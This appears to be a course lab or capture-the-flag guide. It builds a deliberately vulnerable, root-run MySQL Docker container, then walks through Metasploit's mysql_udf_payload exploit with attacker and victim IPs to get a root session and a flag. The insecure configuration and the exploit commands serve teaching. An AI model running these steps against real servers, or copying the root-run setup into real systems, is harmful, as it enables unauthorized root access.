# Overview
These instructions will create a MySQL 5.7.20 instance inside a Docker container on a Ubuntu 22.04 server. The server is vulnerable to the /multi/mysql/mysql_udf_payload exploit in Metasploit. The MySQL service is running as root, allowing an attacker to gain privilege escalation on the target system. I shouldn't have to say this out loud, but this should ABSOLUTELY NOT under any circumstances be used in a production environment.
# Setup
1. Download files to build container
    ```
    $ wget https://raw.githubusercontent.com/TechGeek001/Netsec/main/mysqldb/mysqldb-UbuntuServerX86-64.sh
    $ chmod +x mysqldb-UbuntuServerX86-64.sh
    $ ./mysqldb-UbuntuServerX86-64.sh
    ```
2. Navigate to the newly created directory and build the Docker container
    ```
    $ cd mysqldb/mysqldb/UbuntuServerX86-64
    ```
3. Build and run the Docker container
    ```
    $ docker build -t tmysqldb .
    $ docker run -d --name mysqldb --dns 192.168.25.10 --dns-search netsec-docker.isi.jhu.edu --privileged --network host tmysqldb:latest
    ```
4. Exec into the Docker container
    ```
    $ docker exec -it mysqldb bash
    ```
5. Finish configuring MySQL (this can't be done during the build)
    ```
    # cd /root
    # chmod +x setup.sh
    # ./setup.sh
    ```
    The setup script populates the databases, creates administrative users with the correct permissions, and removes the /root/temp folder.
# Verify
1. Confirm that the /root/temp directory is gone with ```ls /root/```
2. Confirm that the database was created
   ```
   # mysql
   mysql> use database eadu;
   mysql> select * from users;
   ```
# Exploit
This procedure was tested on Kali Linux 22.04 using Metasploit Framework 6.4.2-dev
1. Start the MSF Console
   ```
   $ sudo msfconsole
   ```
2. Select the desired exploit
    ```
    > use exploit/multi/mysql/mysql_udf_payload
    ```
3. Set the correct options. In this example, the attacker is 1.1.1.1 and the victim is 2.2.2.2
    ```
    > set LHOST 1.1.1.1
    > set SRVHOST 1.1.1.1
    > set RHOST 2.2.2.2
    > set USERNAME <username>
    > set PASSWORD <password>
    > set target 1
    > exploit
    ```
    Note: MSF will claim that the exploit fails, but the session is still created. Not sure why this happens.
4. Open the session (in this example, it is session 1) and test to see which user this payload is running as.
    ```
    > sessions -i 1
    > show guid
    Server username: root
    ```
5. The flag is located in ```/root```
